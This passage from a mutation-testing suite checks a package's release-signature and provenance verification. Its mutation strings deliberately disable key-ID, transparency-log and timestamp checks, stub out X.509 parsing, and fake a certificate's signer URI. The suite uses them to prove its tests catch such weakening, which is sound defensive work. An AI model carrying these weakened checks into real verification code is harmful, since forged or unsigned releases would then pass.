      '        \'["publicKey", "tlogEntries", "timestampVerificationData"]\',',
      '        \'["x509CertificateChain", "tlogEntries", "timestampVerificationData"]\'',
      "      )"
    ].join("\n");
    const legacyM157CallNode = 'replaceExactly(mcpbInputs.integrity, "verified.tlogEntries.length === 0", "false")';
    const legacyM158CallNode =
      'replaceExactly(mcpbInputs.integrity, "!isRecord(verified.timestampVerificationData)", "false")';
    const legacyM159CallNode = [
      "replaceExactly(",
      "        mcpbInputs.integrity,",
      '        "/^SHA256:[A-Za-z0-9+/]{43}$/u.test(publicKey.hint)",',
      "        'publicKey.hint.startsWith(\"SHA256:\")'",
      "      )"
    ].join("\n");
    const legacyM160CallNode = 'replaceExactly(mcpbInputs.integrity, "keyid !== publicKey.hint", "false")';
    const legacyM161CallNode =
      'replaceExactly(mcpbInputs.integrity, "chain.certificates.length !== 1", "chain.certificates.length < 1")';
    const legacyM162CallNode = [
      "replaceExactly(",
      "        mcpbInputs.integrity,",
      '        "decodeCanonicalBase64(certificate.rawBytes",',
      '        "Buffer.from(certificate.rawBytes"',
      "      )"
    ].join("\n");
    const legacyM163CallNode = [
      "replaceExactly(",
      "        mcpbInputs.integrity,",
      "        'import { X509Certificate } from \"node:crypto\";',",
      '        "const X509Certificate = undefined;"',
      "      )"
    ].join("\n");
    const legacyM164CallNode = [
      "replaceExactly(",
      "        mcpbInputs.integrity,",
      '        "leafCertificate = new X509Certificate(certificateDer);",',
      `        \`leafCertificate = { subjectAltName: \\\`URI:\\\${expectedSignerUri}\\\` };\``,
      "      )"
    ].join("\n");
    expect(sha256Text(legacyM108CallNode)).toBe("067bacefc171385fbf496ba6d7e25ad9403569d2a8daeba29e483e8c486507b8");
    expect(sha256Text(legacyM107CallNode)).toBe("b67c164531f5a0702f1ceb3ec750cf4df6f655ac68d12fbb31bf04db35ca5325");
    expect(sha256Text(legacyM109CallNode)).toBe("24c05d112a2d846080b17c7413f555c37b2c50a54975f16a985d8b1018b2d711");
    expect(sha256Text(legacyM110CallNode)).toBe("69e2c8d2350a13c0b755c30190653e9d60a78c7eac7ca5996f624663a0d31c8d");
    expect(sha256Text(legacyM111CallNode)).toBe("77aaafb7f62f9bb1addab5347cb5e704ece40a7354569378d17d1881bb3e1479");
    expect(sha256Text(legacyM112CallNode)).toBe("2472b8e6ac2bbd1d245fe3c4a80a0e02feb000823d261169c21161a276c54b0d");
    expect(sha256Text(legacyM113CallNode)).toBe("ebe9c3077c0627c8d7ac444bbfaf9fedf4e51e6c152ca81593c40bf6dc831742");
    expect(sha256Text(legacyM114CallNode)).toBe("33eafb51e59c895771d9b0523834365e423477bdee438022ebba3866ac293581");
    expect(sha256Text(legacyM115CallNode)).toBe("32f57ce2ec034103af6ada47d96577ac16df4c63e90c2ea31994b106f4955576");
    expect(sha256Text(legacyM116CallNode)).toBe("54be2d32d9f71d6781fa5b76a93b19373e8387f0c99452104b3676ab8060c27c");
    expect(sha256Text(legacyM117CallNode)).toBe("6255d6dc505099d10ea951efa0ff2bd01583bce7caeb565dd28ffa9d6415b9c1");
    expect(sha256Text(legacyM118CallNode)).toBe("2ee0dd47ee5eff32f85a211d3ff97442bcb04cf9dbdfc40adaeb2168d4186da9");
    expect(sha256Text(legacyM119CallNode)).toBe("7a36fed60778fadcf6d4201175b6b9bfa95fc3abfde05f3c63b107f56b72d791");
    expect(sha256Text(legacyM120CallNode)).toBe("ccd2d90b61c718eb1eda20534d4f4aceba81f47204934f8fd5121614c8fd02f4");
    expect(sha256Text(legacyM121CallNode)).toBe("1d3cc9522c1816d75444d959205382473a871c923c368c70428f0726b3ce9c94");
    expect(sha256Text(legacyM122CallNode)).toBe("7a7621c1f9a23dff5d41a78a1b2d7cd93064c016b5f1096cbba461f75bcabe1e");
    expect(sha256Text(legacyM123CallNode)).toBe("291ff89757fe8bdf1802128e2d5eaa50b97bf911c1d1e8f2556134b212b311b0");
    expect(sha256Text(legacyM124CallNode)).toBe("9c2db9142fa26ee12b3bacdcddf25454e02e115512fb4a4046a7551f865969d6");
    expect(sha256Text(legacyM125CallNode)).toBe("831d3bdfe43fbb0c1a5bc6edea87c729869d52df54316814b734f1a09d47e048");
    expect(sha256Text(legacyM126CallNode)).toBe("a57fcbf5f69a93231f615fa5adbbb9209b999b5da510f75bf4083c544f878057");
    expect(sha256Text(legacyM127CallNode)).toBe("fcff4d18f06c85f3f808501ff9bf1e361422b61a4e7c5e3d157d1bb0aad19d26");
    expect(sha256Text(legacyM128CallNode)).toBe("ab716cd073b425a0fc02698dbc5cffa1089648e086c65f0ef15664e5ba8b99c5");
    expect(sha256Text(legacyM129CallNode)).toBe("aba88ee9863569cd07d1d8c96991f90391ac82a2616562c2556559315ae691ac");
    expect(sha256Text(legacyM130CallNode)).toBe("dabf96e7320490ff03e46edf67376cf6a77c09687d4802a03d552fa2ad18c70f");
    expect(sha256Text(legacyM131CallNode)).toBe("54e07b1103b1ab04d1d5a91b1e8c7247a3c630c22eeb42094e1909f0efe2b4be");
    expect(sha256Text(legacyM132CallNode)).toBe("72d650f63a9a815ed6aeee6a1cde1e605a53bba7135b6f68253693112dc6e114");
    expect(sha256Text(legacyM133CallNode)).toBe("6fd7469435fa857723b0e0edf4150958b6435652f3c585d509d3fd82a92e70cf");
    expect(sha256Text(legacyM134CallNode)).toBe("7f6e5eacdfaaf724f57fb1230bc79806fa0cce605112e0ffb2c06b2c82158754");
    expect(sha256Text(legacyM135CallNode)).toBe("22b8a6ab7a052ff432a0206e00199c6c93b93af8c405bdd3c57dd5f22d2debd0");
    expect(sha256Text(legacyM136CallNode)).toBe("2aece263e89b22d9f6979dab5a709292d7f6260d823de7ba3b44ac942b31f6bc");
    expect(sha256Text(legacyM137CallNode)).toBe("147f6fb2e8dc61d9bce792ee4f517a904ed1968626f67fc7c4926bd0020ed2fc");
    expect(sha256Text(legacyM138CallNode)).toBe("ec68ecbf32fe008b7c61ec462472bc8e6f991b22f602537d3fa7f1d24d7ab2da");
    expect(sha256Text(legacyM140CallNode)).toBe("b126ab8cd858d4b22abf9fbd6960452f74668e10d01bc8b014a0c69eb63045a7");
    expect(sha256Text(legacyM139CallNode)).toBe("a91bac7ed981a45912ad2805759f74175e5103cf1962a3164bc8503170c8a0e4");
    expect(sha256Text(legacyM141CallNode)).toBe("0c17b17d96cb980db5f16f68efa9b4046f90988aa619cb19f859983e259ac221");
    expect(sha256Text(legacyM142CallNode)).toBe("18c5bdae69d4094f22db3355424611092d3d5fc4327938f01aadc1edc345c691");
    expect(sha256Text(legacyM143CallNode)).toBe("a9207d636e7fd957467c1c611fcfc148606acbb3f951bcc51b79d2bf3afa0a49");
    expect(sha256Text(legacyM145CallNode)).toBe("824892c0d06ddf0a0b8cb334a8003e67a31a81d14cb9950e7c4565ff3edb7aa2");
    expect(sha256Text(legacyM144CallNode)).toBe("a64078e44ccd14141709207517fb0162e64931b8058b0e39302069643c677439");
    expect(sha256Text(legacyM146CallNode)).toBe("0ae283ec909698bbf7da5ba4701e6b322ae7f5c3e9332aa323c5dea7767d79a7");
    expect(sha256Text(legacyM147CallNode)).toBe("5e9484c67e3a3c30a1d50aa5f3627a68541e7ba79fe718727e86b5e4b6a55d6b");
    expect(sha256Text(legacyM148CallNode)).toBe("c98393f86f61af497a07e9a6043abf60246714b1b24cff2073a1d6f3fba2b0a2");
    expect(sha256Text(legacyM149CallNode)).toBe("d4548f5a97a44230d34b67d2909904002692557a6c8225dafcc7df6ad8fd743d");
    expect(sha256Text(legacyM150CallNode)).toBe("f01f3e651712890c745817ab852e2271542b090b3d71402a566ef1e30d7d2719");
    expect(sha256Text(legacyM151CallNode)).toBe("1bac195e03120f6aa936ddab2e35ec81c8881082b1ad3e425726938dcd81a767");
    expect(sha256Text(legacyM152CallNode)).toBe("a234cbc29d6b489a7e391efe19ca46d945b9c84155075462a8d05ff12d9de668");
    expect(sha256Text(legacyM153CallNode)).toBe("f714ec3fbaefafe10a9d199545d389df96d48fd025a136f0d83923d843ea9f93");
    expect(sha256Text(legacyM154CallNode)).toBe("c03766ab7fb73109ce057850f6498e9940b762130d62fc445f6af93e3d302c90");
    expect(sha256Text(legacyM155CallNode)).toBe("5b891035851fb56a761310b6d98bd1244e7a307785eb7f6f5458ec8b74ba11b1");
    expect(sha256Text(legacyM156CallNode)).toBe("323e26c7e9e96b1679e2f607360b5b8c28aa561c28ac5c5c69cf195e59b415ba");
    expect(sha256Text(legacyM157CallNode)).toBe("8e04dacbc3ae75870a394f90bf328145c8402e689ac3830e5139212e347524e9");
    expect(sha256Text(legacyM158CallNode)).toBe("75daf210ce50f1f1d19c41385e97dfad751c593e1721c2566505d1a5478dcf94");
    expect(sha256Text(legacyM159CallNode)).toBe("7c632cbce18feb63cf7622544dc1a02025b5426de18206d6b2417d01baae4822");
    expect(sha256Text(legacyM160CallNode)).toBe("4c94cc56bf3864e4fdf69233912298611a32cafbf5d2af4e27d363f8df404fcf");
    expect(sha256Text(legacyM161CallNode)).toBe("ce7bafc0132a56e76cfeb718d731550b95036558e17c03695a87f48e585d25aa");
    expect(sha256Text(legacyM162CallNode)).toBe("df0c2616b03ba399034bcbdd2b73f77cc667b2f6aad882cdaa6ec76d8eb15d1e");
    expect(sha256Text(legacyM163CallNode)).toBe("2162c3f9b4e9a20b403d28dccc28a7f23bdbbbab6717ef7d7cb63c679f1d0a4d");
    expect(sha256Text(legacyM164CallNode)).toBe("fff8d6c5a7629ddf8f195b635d8cd5567c6d3e16b98e9773900353ea7cfb4f82");
    const resurrectedRegistryRoots = replaceExactly(
      matrixSource,
      finalRequiredReleaseCheck,
      [
        `    void ${legacyM107CallNode};`,
        `    void ${legacyM109CallNode};`,
        `    void ${legacyM110CallNode};`,
        `    void ${legacyM111CallNode};`,
        `    void ${legacyM112CallNode};`,
        `    void ${legacyM113CallNode};`,
        `    void ${legacyM114CallNode};`,
        `    void ${legacyM115CallNode};`,
        `    void ${legacyM116CallNode};`,
        `    void ${legacyM117CallNode};`,
        `    void ${legacyM118CallNode};`,
        `    void ${legacyM119CallNode};`,
        `    void ${legacyM120CallNode};`,
        `    void ${legacyM121CallNode};`,
        `    void ${legacyM122CallNode};`,
        `    void ${legacyM123CallNode};`,
        `    void ${legacyM124CallNode};`,
        `    void ${legacyM125CallNode};`,
        `    void ${legacyM126CallNode};`,
        `    void ${legacyM127CallNode};`,
        `    void ${legacyM128CallNode};`,
        `    void ${legacyM129CallNode};`,
        `    void ${legacyM130CallNode};`,
        `    void ${legacyM131CallNode};`,
        `    void ${legacyM132CallNode};`,
        `    void ${legacyM133CallNode};`,
        `    void ${legacyM134CallNode};`,
        `    void ${legacyM135CallNode};`,
        `    void ${legacyM136CallNode};`,
        `    void ${legacyM137CallNode};`,
        `    void ${legacyM138CallNode};`,
        `    void ${legacyM139CallNode};`,
        `    void ${legacyM141CallNode};`,
        `    void ${legacyM142CallNode};`,
        `    void ${legacyM143CallNode};`,
        `    void ${legacyM144CallNode};`,
        `    void ${legacyM146CallNode};`,
        `    void ${legacyM147CallNode};`,
        `    void ${legacyM148CallNode};`,
        `    void ${legacyM149CallNode};`,
        `    void ${legacyM150CallNode};`,
        `    void ${legacyM151CallNode};`,
        `    void ${legacyM152CallNode};`,
        `    void ${legacyM153CallNode};`,
        `    void ${legacyM154CallNode};`,
        `    void ${legacyM155CallNode};`,
        `    void ${legacyM156CallNode};`,
        `    void ${legacyM157CallNode};`,
        `    void ${legacyM158CallNode};`,
        `    void ${legacyM159CallNode};`,
        `    void ${legacyM160CallNode};`,
        `    void ${legacyM161CallNode};`,
        `    void ${legacyM162CallNode};`,
        `    void ${legacyM163CallNode};`,
        `    void ${legacyM164CallNode};`,
        finalRequiredReleaseCheck
      ].join("\n")
    );
    const resurrectedRegistryProblems = historicalMutationProblems(resurrectedRegistryRoots);
    expect(resurrectedRegistryProblems).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m108 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m107 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m109 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m110 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m111 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m112 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m113 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m114 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m115 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m116 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m117 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m118 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m119 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m120 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m121 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m122 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m123 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m124 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m125 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m126 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m127 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m128 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m129 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m130 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m131 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m132 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m133 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m134 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m135 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m136 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m137 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m138 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m140 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m139 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m141 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m142 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m143 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m145 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m144 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m146 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m147 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m148 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m149 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m150 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m151 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m152 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m153 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m154 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m155 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m156 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m157 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m158 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m159 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m160 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m161 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m162 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m163 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m164 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        )
      ])
    );
    expect(resurrectedRegistryProblems).not.toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /remaining legacy order|legacy case .* has no remaining root call|remaining matcher census/
        )
      ])
    );

    const m108BlockStart = matrixSource.indexOf(
      '    const releaseMutationM108 = releaseMutationPlan.registerMutation("release.m108", {'
    );
    const m107BlockStart = matrixSource.indexOf(
      '    const releaseMutationM107 = releaseMutationPlan.registerMutation("release.m107", {'
    );
    const m109BlockStart = matrixSource.indexOf(
      '    const releaseMutationM109 = releaseMutationPlan.registerMutation("release.m109", {'
    );
    const m110BlockStart = matrixSource.indexOf(
      '    const releaseMutationM110 = releaseMutationPlan.registerMutation("release.m110", {'
    );
    const m111BlockStart = matrixSource.indexOf(
      '    const releaseMutationM111 = releaseMutationPlan.registerMutation("release.m111", {'
    );
    const releaseWorkflowSourceStart = matrixSource.indexOf(
      "    const releaseWorkflowFixtureSource = releaseMutationPlan.registerSource("
    );
    const m112BlockStart = matrixSource.indexOf(
      '    const releaseMutationM112 = releaseMutationPlan.registerMutation("release.m112", {'
    );
    const m113BlockStart = matrixSource.indexOf(
      '    const releaseMutationM113 = releaseMutationPlan.registerMutation("release.m113", {'
    );
    const m114BlockStart = matrixSource.indexOf(
      '    const releaseMutationM114 = releaseMutationPlan.registerMutation("release.m114", {'
    );
    const m115BlockStart = matrixSource.indexOf(
      '    const releaseMutationM115 = releaseMutationPlan.registerMutation("release.m115", {'
    );
    const m116BlockStart = matrixSource.indexOf(
      '    const releaseMutationM116 = releaseMutationPlan.registerMutation("release.m116", {'
    );
    const m117BlockStart = matrixSource.indexOf(
      '    const releaseMutationM117 = releaseMutationPlan.registerMutation("release.m117", {'
    );
    const m118BlockStart = matrixSource.indexOf(
      '    const releaseMutationM118 = releaseMutationPlan.registerMutation("release.m118", {'
    );
    const m119BlockStart = matrixSource.indexOf(
      '    const releaseMutationM119 = releaseMutationPlan.registerMutation("release.m119", {'
    );
    const m120BlockStart = matrixSource.indexOf(
      '    const releaseMutationM120 = releaseMutationPlan.registerMutation("release.m120", {'
    );
    const m121BlockStart = matrixSource.indexOf(
      '    const releaseMutationM121 = releaseMutationPlan.registerMutation("release.m121", {'
    );
    const m122BlockStart = matrixSource.indexOf(
      '    const releaseMutationM122 = releaseMutationPlan.registerMutation("release.m122", {'
    );
    const m123BlockStart = matrixSource.indexOf(
      '    const releaseMutationM123 = releaseMutationPlan.registerMutation("release.m123", {'
    );
    const m124BlockStart = matrixSource.indexOf(
      '    const releaseMutationM124 = releaseMutationPlan.registerMutation("release.m124", {'
    );
    const m125BlockStart = matrixSource.indexOf(
      '    const releaseMutationM125 = releaseMutationPlan.registerMutation("release.m125", {'
    );
    const m126BlockStart = matrixSource.indexOf(
      '    const releaseMutationM126 = releaseMutationPlan.registerMutation("release.m126", {'
    );
    const m127BlockStart = matrixSource.indexOf(
      '    const releaseMutationM127 = releaseMutationPlan.registerMutation("release.m127", {'
    );
    const m128BlockStart = matrixSource.indexOf(
      '    const releaseMutationM128 = releaseMutationPlan.registerMutation("release.m128", {'
    );
    const m129BlockStart = matrixSource.indexOf(
      '    const releaseMutationM129 = releaseMutationPlan.registerMutation("release.m129", {'
    );
    const m130BlockStart = matrixSource.indexOf(
      '    const releaseMutationM130 = releaseMutationPlan.registerMutation("release.m130", {'
    );
    const m131BlockStart = matrixSource.indexOf(
      '    const releaseMutationM131 = releaseMutationPlan.registerMutation("release.m131", {'
    );
    const m132BlockStart = matrixSource.indexOf(
      '    const releaseMutationM132 = releaseMutationPlan.registerMutation("release.m132", {'
    );
    const m133BlockStart = matrixSource.indexOf(
      '    const releaseMutationM133 = releaseMutationPlan.registerMutation("release.m133", {'
    );
    const m134BlockStart = matrixSource.indexOf(
      '    const releaseMutationM134 = releaseMutationPlan.registerMutation("release.m134", {'
    );
    const m135BlockStart = matrixSource.indexOf(
      '    const releaseMutationM135 = releaseMutationPlan.registerMutation("release.m135", {'
    );
    const m136BlockStart = matrixSource.indexOf(
      '    const releaseMutationM136 = releaseMutationPlan.registerMutation("release.m136", {'
    );
    const m137BlockStart = matrixSource.indexOf(
      '    const releaseMutationM137 = releaseMutationPlan.registerMutation("release.m137", {'
    );
    const m138BlockStart = matrixSource.indexOf(
      '    const releaseMutationM138 = releaseMutationPlan.registerMutation("release.m138", {'
    );
    const npmProvenanceAuditCommandSourceStart = matrixSource.indexOf(
      "    const npmProvenanceAuditCommandSource = releaseMutationPlan.registerSource("
    );
    const m140BlockStart = matrixSource.indexOf(
      '    const releaseMutationM140 = releaseMutationPlan.registerMutation("release.m140", {'
    );
    const m139BlockStart = matrixSource.indexOf(
      '    const releaseMutationM139 = releaseMutationPlan.registerMutation("release.m139", {'
    );
    const m141BlockStart = matrixSource.indexOf(
      '    const releaseMutationM141 = releaseMutationPlan.registerMutation("release.m141", {'
    );
    const m142BlockStart = matrixSource.indexOf(
      '    const releaseMutationM142 = releaseMutationPlan.registerMutation("release.m142", {'
    );
    const m143BlockStart = matrixSource.indexOf(
      '    const releaseMutationM143 = releaseMutationPlan.registerMutation("release.m143", {'
    );
    const npmProvenanceEvaluatorCommandSourceStart = matrixSource.indexOf(
      "    const npmProvenanceEvaluatorCommandSource = releaseMutationPlan.registerSource("
    );
    const m145BlockStart = matrixSource.indexOf(
      '    const releaseMutationM145 = releaseMutationPlan.registerMutation("release.m145", {'
    );
    const m144BlockStart = matrixSource.indexOf(
      '    const releaseMutationM144 = releaseMutationPlan.registerMutation("release.m144", {'
    );
    const m146BlockStart = matrixSource.indexOf(
      '    const releaseMutationM146 = releaseMutationPlan.registerMutation("release.m146", {'
    );
    const m147BlockStart = matrixSource.indexOf(
      '    const releaseMutationM147 = releaseMutationPlan.registerMutation("release.m147", {'
    );
    const m148BlockStart = matrixSource.indexOf(
      '    const releaseMutationM148 = releaseMutationPlan.registerMutation("release.m148", {'
    );
    const m149BlockStart = matrixSource.indexOf(
      '    const releaseMutationM149 = releaseMutationPlan.registerMutation("release.m149", {'
    );
    const m150BlockStart = matrixSource.indexOf(
      '    const releaseMutationM150 = releaseMutationPlan.registerMutation("release.m150", {'
    );
    const m151BlockStart = matrixSource.indexOf(
      '    const releaseMutationM151 = releaseMutationPlan.registerMutation("release.m151", {'
    );
    const m152BlockStart = matrixSource.indexOf(
      '    const releaseMutationM152 = releaseMutationPlan.registerMutation("release.m152", {'
    );
    const m153BlockStart = matrixSource.indexOf(
      '    const releaseMutationM153 = releaseMutationPlan.registerMutation("release.m153", {'
    );
    const m154BlockStart = matrixSource.indexOf(
      '    const releaseMutationM154 = releaseMutationPlan.registerMutation("release.m154", {'
    );
    const m155BlockStart = matrixSource.indexOf(
      '    const releaseMutationM155 = releaseMutationPlan.registerMutation("release.m155", {'
    );
    const m156BlockStart = matrixSource.indexOf(
      '    const releaseMutationM156 = releaseMutationPlan.registerMutation("release.m156", {'
    );
    const m157BlockStart = matrixSource.indexOf(
      '    const releaseMutationM157 = releaseMutationPlan.registerMutation("release.m157", {'
    );
    const m158BlockStart = matrixSource.indexOf(
      '    const releaseMutationM158 = releaseMutationPlan.registerMutation("release.m158", {'
    );
    const m159BlockStart = matrixSource.indexOf(
      '    const releaseMutationM159 = releaseMutationPlan.registerMutation("release.m159", {'
    );
    const m160BlockStart = matrixSource.indexOf(
      '    const releaseMutationM160 = releaseMutationPlan.registerMutation("release.m160", {'
    );
    const m161BlockStart = matrixSource.indexOf(
      '    const releaseMutationM161 = releaseMutationPlan.registerMutation("release.m161", {'
    );
    const m162BlockStart = matrixSource.indexOf(
      '    const releaseMutationM162 = releaseMutationPlan.registerMutation("release.m162", {'
    );
    const m163BlockStart = matrixSource.indexOf(
      '    const releaseMutationM163 = releaseMutationPlan.registerMutation("release.m163", {'
    );
    const m164BlockStart = matrixSource.indexOf(
      '    const releaseMutationM164 = releaseMutationPlan.registerMutation("release.m164", {'
    );
    const declarativeSealStart = matrixSource.indexOf(
      "    const releaseMutationProblems = releaseMutationPlan.seal();",
      m164BlockStart
    );
    expect(m108BlockStart).toBeGreaterThan(0);
    expect(m107BlockStart).toBeGreaterThan(m108BlockStart);
    expect(m109BlockStart).toBeGreaterThan(m107BlockStart);
    expect(m110BlockStart).toBeGreaterThan(m109BlockStart);
    expect(m111BlockStart).toBeGreaterThan(m110BlockStart);
    expect(releaseWorkflowSourceStart).toBeGreaterThan(m111BlockStart);
    expect(m112BlockStart).toBeGreaterThan(releaseWorkflowSourceStart);
    expect(m113BlockStart).toBeGreaterThan(m112BlockStart);
    expect(m114BlockStart).toBeGreaterThan(m113BlockStart);
    expect(m115BlockStart).toBeGreaterThan(m114BlockStart);
    expect(m116BlockStart).toBeGreaterThan(m115BlockStart);
    expect(m117BlockStart).toBeGreaterThan(m116BlockStart);
    expect(m118BlockStart).toBeGreaterThan(m117BlockStart);
    expect(m119BlockStart).toBeGreaterThan(m118BlockStart);
    expect(m120BlockStart).toBeGreaterThan(m119BlockStart);
    expect(m121BlockStart).toBeGreaterThan(m120BlockStart);
    expect(m122BlockStart).toBeGreaterThan(m121BlockStart);
    expect(m123BlockStart).toBeGreaterThan(m122BlockStart);
    expect(m124BlockStart).toBeGreaterThan(m123BlockStart);
    expect(m125BlockStart).toBeGreaterThan(m124BlockStart);
    expect(m126BlockStart).toBeGreaterThan(m125BlockStart);
    expect(m127BlockStart).toBeGreaterThan(m126BlockStart);
    expect(m128BlockStart).toBeGreaterThan(m127BlockStart);
    expect(m129BlockStart).toBeGreaterThan(m128BlockStart);
    expect(m130BlockStart).toBeGreaterThan(m129BlockStart);
    expect(m131BlockStart).toBeGreaterThan(m130BlockStart);
    expect(m132BlockStart).toBeGreaterThan(m131BlockStart);
    expect(m133BlockStart).toBeGreaterThan(m132BlockStart);
    expect(m134BlockStart).toBeGreaterThan(m133BlockStart);
    expect(m135BlockStart).toBeGreaterThan(m134BlockStart);
    expect(m136BlockStart).toBeGreaterThan(m135BlockStart);
    expect(m137BlockStart).toBeGreaterThan(m136BlockStart);
    expect(m138BlockStart).toBeGreaterThan(m137BlockStart);
    expect(npmProvenanceAuditCommandSourceStart).toBeGreaterThan(m138BlockStart);
    expect(m140BlockStart).toBeGreaterThan(npmProvenanceAuditCommandSourceStart);
    expect(m139BlockStart).toBeGreaterThan(m140BlockStart);
    expect(m141BlockStart).toBeGreaterThan(m139BlockStart);
    expect(m142BlockStart).toBeGreaterThan(m141BlockStart);
    expect(m143BlockStart).toBeGreaterThan(m142BlockStart);
